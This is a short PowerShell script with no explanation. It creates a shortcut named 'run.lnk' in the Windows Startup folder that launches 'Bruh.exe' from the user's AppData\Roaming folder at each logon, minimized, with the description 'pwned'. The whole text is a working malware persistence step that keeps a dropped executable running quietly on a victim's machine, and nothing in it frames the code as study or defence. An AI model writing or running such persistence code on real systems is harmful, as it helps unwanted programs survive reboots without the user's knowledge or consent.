<d1>
$ComObj = New-Object -ComObject WScript.Shell
$ShortCut = $ComObj.CreateShortcut("$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk")
$ShortCut.TargetPath = "$Env:USERPROFILE\AppData\Roaming\Bruh.exe"
$ShortCut.Description = "pwned"
$ShortCut.FullName 
$ShortCut.WindowStyle = 7
$ShortCut.Save()
<d1>
